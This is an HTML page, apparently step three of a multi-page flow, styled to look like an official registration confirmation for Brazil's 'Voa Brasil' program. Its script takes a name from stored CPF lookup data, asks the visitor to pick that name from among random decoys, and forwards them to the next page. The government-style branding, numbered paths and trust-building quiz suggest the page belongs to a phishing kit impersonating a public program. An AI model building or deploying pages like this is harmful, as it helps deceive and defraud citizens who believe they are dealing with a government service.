<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
    />
    <title>Voa Brasil - Confirmação</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: "Rawline", -apple-system, BlinkMacSystemFont, "Segoe UI",
          sans-serif;
      }

      body {
        background-color: #f8f9fa;
        min-height: 100vh;
        max-width: 100%;
        overflow-x: hidden;
        position: relative;
      }

      .header-image {
        width: 100%;
        background: white;
      }

      .header-image img {
        width: 100%;
        height: auto;
        display: block;
      }

      .container {
        width: 100%;
        max-width: 460px;
        margin: 16px auto;
        background: white;
        padding: 16px;
      }

      .top-bar {
        background: white;
        padding: 8px 12px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border-bottom: 1px solid #ddd;
        width: 100%;
      }

      .logo {
        height: 24px;
      }

      .top-icons {
        display: flex;
        align-items: center;
        gap: 12px;
      }

      .top-icons img {
        height: 20px;
      }

      .user-button {
        background: #1351b4;
        color: white;
        padding: 4px 12px;
        border-radius: 20px;
        text-decoration: none;
        font-size: 12px;
      }

      .sub-header {
        background: white;
        padding: 8px 12px;
        display: flex;
        align-items: center;
        gap: 12px;
        border-bottom: 1px solid #ddd;
        width: 100%;
      }

      .menu-icon {
        font-size: 20px;
      }

      .sub-header h1 {
        font-size: 14px;
        font-weight: 500;
      }

      .title {
        font-size: 18px;
        color: #1b1b1b;
        text-align: center;
        margin-bottom: 24px;
      }

      .question {
        margin-bottom: 16px;
      }

      .question-number {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        width: 20px;
        height: 20px;
        background: #1351b4;
        color: white;
        border-radius: 50%;
        margin-right: 8px;
        font-size: 12px;
      }

      .question-text {
        font-size: 14px;
        color: #1b1b1b;
      }

      .options {
        display: flex;
        flex-direction: column;
        gap: 8px;
      }

      .option {
        padding: 16px;
        background: #f8f9fa;
        border-radius: 4px;
        cursor: pointer;
        font-size: 14px;
        border: 2px solid transparent;
        transition: all 0.2s ease;
      }

      .option:hover {
        background: #e9ecef;
      }

      .option.selected {
        background: #e5f0ff;
        border-color: #1351b4;
        color: #1351b4;
      }

      .confirm-button {
        width: 100%;
        padding: 12px;
        background: #1351b4;
        color: white;
        border: none;
        border-radius: 20px;
        font-size: 14px;
        cursor: pointer;
        margin-top: 24px;
      }

      .confirm-button:hover {
        background: #0d47a1;
      }

      .social-links {
        display: flex;
        justify-content: center;
        gap: 20px;
        margin: 30px 0;
      }

      .social-links a {
        color: #1351b4;
        text-decoration: none;
      }

      .footer-image {
        width: 100%;
        margin-top: 40px;
      }

      .footer-image img {
        width: 100%;
        height: auto;
        display: block;
      }

      .header-content {
        position: absolute;
        top: 8px;
        right: 16px;
        display: flex;
        align-items: center;
        gap: 12px;
        z-index: 10;
      }

      .header-button {
        background: transparent;
        color: white;
        padding: 6px 16px 6px 36px;
        border-radius: 20px;
        text-decoration: none;
        font-size: 14px;
        font-weight: 500;
        position: relative;
      }

      .header-button::before {
        content: "";
        position: absolute;
        left: 12px;
        top: 50%;
        transform: translateY(-50%);
        width: 16px;
        height: 16px;
        background-image: url("imagens/user-icon.png");
        background-size: contain;
        background-repeat: no-repeat;
      }

      .header-button:hover {
        background: transparent;
        opacity: 0.9;
      }

      /* Estilo para a mensagem de erro */
      .error-message {
        background-color: #ffebee;
        color: #c62828;
        padding: 12px;
        border-radius: 4px;
        margin-top: 16px;
        font-size: 14px;
        display: flex;
        align-items: center;
        border-left: 4px solid #c62828;
        display: none;
      }

      .error-message::before {
        content: "⚠️";
        margin-right: 8px;
        font-size: 16px;
      }

      /* Animação para a mensagem de erro */
      @keyframes fadeIn {
        from {
          opacity: 0;
          transform: translateY(-10px);
        }
        to {
          opacity: 1;
          transform: translateY(0);
        }
      }

      .error-message.show {
        display: flex;
        animation: fadeIn 0.3s ease-out forwards;
      }

      @media (max-width: 480px) {
        .container {
          margin: 12px auto;
          padding: 12px;
        }

        .title {
          font-size: 16px;
          margin-bottom: 20px;
        }

        .option {
          padding: 10px;
        }
      }
    </style>
  </head>

  <body>
    <div class="header-image">
      <img src="images/head-pag3-2.0.jpg" alt="Header" />
      <div class="header-content">
        <a href="#" class="header-button">CLIENTE</a>
      </div>
    </div>

    <div class="container">
      <h2 class="title">
        Confirme seus dados para o cadastro<br />no Programa Voa Brasil
      </h2>

      <div class="question">
        <span class="question-number">1</span>
        <span class="question-text">Qual é seu nome completo?</span>
      </div>

      <div class="options" id="options-div"></div>

      <div id="error-message" class="error-message">
        Por favor, selecione o nome correto para continuar.
      </div>

      <button class="confirm-button" id="confirm-button">Confirmar</button>
    </div>

    <div class="footer-image">
      <img src="images/rodape3.jpg" alt="Rodapé" />
    </div>

    <script>
      function log(message, data = null) {
        if (data) {
          console.log(`[VOA BRASIL] ${message}:`, data);
        } else {
          console.log(`[VOA BRASIL] ${message}`);
        }
      }

      function gerarNomesAleatorios(nomeCorreto, quantidade) {
        log("Gerando nomes aleatórios");

        const primeirosNomes = [
          "João",
          "Maria",
          "Pedro",
          "Ana",
          "Carlos",
          "Juliana",
          "Lucas",
          "Mariana",
          "Rafael",
          "Fernanda",
          "Bruno",
          "Camila",
          "Gustavo",
          "Patrícia",
          "Rodrigo",
          "Amanda",
          "Felipe",
          "Aline",
          "Ricardo",
          "Vanessa",
          "Heitor",
          "Larissa",
        ];

        const sobrenomes = [
          "Silva",
          "Santos",
          "Oliveira",
          "Souza",
          "Rodrigues",
          "Ferreira",
          "Almeida",
          "Pereira",
          "Lima",
          "Gomes",
          "Costa",
          "Ribeiro",
          "Martins",
          "Carvalho",
          "Alves",
          "Nascimento",
          "Moreira",
          "Nunes",
          "Monteiro",
          "Mendes",
          "Cardoso",
        ];

        const partesNomeCorreto = nomeCorreto.split(" ");
        const primeiroNomeCorreto = partesNomeCorreto[0];

        const nomesGerados = [];

        while (nomesGerados.length < quantidade) {
          let primeiroNome;
          do {
            primeiroNome =
              primeirosNomes[Math.floor(Math.random() * primeirosNomes.length)];
          } while (primeiroNome === primeiroNomeCorreto);

          const quantidadeSobrenomes = Math.random() > 0.5 ? 2 : 1;
          let nomeCompleto = primeiroNome;

          for (let i = 0; i < quantidadeSobrenomes; i++) {
            const sobrenome =
              sobrenomes[Math.floor(Math.random() * sobrenomes.length)];
            nomeCompleto += " " + sobrenome;
          }

          if (
            nomeCompleto !== nomeCorreto &&
            !nomesGerados.includes(nomeCompleto)
          ) {
            nomesGerados.push(nomeCompleto);
          }
        }

        return nomesGerados;
      }

      function embaralharArray(array) {
        for (let i = array.length - 1; i > 0; i--) {
          const j = Math.floor(Math.random() * (i + 1));
          [array[i], array[j]] = [array[j], array[i]];
        }
        return array;
      }

      document.addEventListener("DOMContentLoaded", function () {
        try {
          const userData = JSON.parse(localStorage.getItem("dadosCPF"));

          if (!userData || !userData.NOME) {
            throw new Error("Dados do usuário não encontrados");
          }

          const nomeCorreto = userData.NOME;

          const nomesAleatorios = gerarNomesAleatorios(nomeCorreto, 3);

          const todasOpcoes = [...nomesAleatorios, nomeCorreto];
          const opcoesEmbaralhadas = embaralharArray(todasOpcoes);

          const optionsDiv = document.getElementById("options-div");
          optionsDiv.innerHTML = "";

          opcoesEmbaralhadas.forEach((nome) => {
            const optionDiv = document.createElement("div");
            optionDiv.className = "option";
            optionDiv.textContent = nome;
            optionsDiv.appendChild(optionDiv);
          });

          const options = document.querySelectorAll(".option");
          const confirmButton = document.getElementById("confirm-button");
          const errorMessage = document.getElementById("error-message");

          let selectedText = "";

          options.forEach((option) => {
            option.addEventListener("click", () => {
              options.forEach((opt) => opt.classList.remove("selected"));
              option.classList.add("selected");
              selectedText = option.textContent.trim();

              errorMessage.classList.remove("show");
            });
          });

          confirmButton.addEventListener("click", () => {
            if (!selectedText) {
              errorMessage.textContent =
                "Por favor, selecione um nome para continuar.";
              errorMessage.classList.add("show");
              return;
            }

            if (selectedText === nomeCorreto) {
              var currentUrlParams = window.location.search;
              window.location.href = "../4/index.html" + currentUrlParams;
            } else {
              errorMessage.textContent =
                "Nome incorreto. Por favor, selecione seu nome correto para continuar.";
              errorMessage.classList.add("show");
            }
          });
        } catch (error) {
          const optionsDiv = document.getElementById("options-div");
          optionsDiv.innerHTML =
            '<div class="error-message show">Ocorreu um erro ao carregar seus dados. Por favor, volte à página anterior e tente novamente.</div>';
        }
      });
    </script>
  </body>
</html>
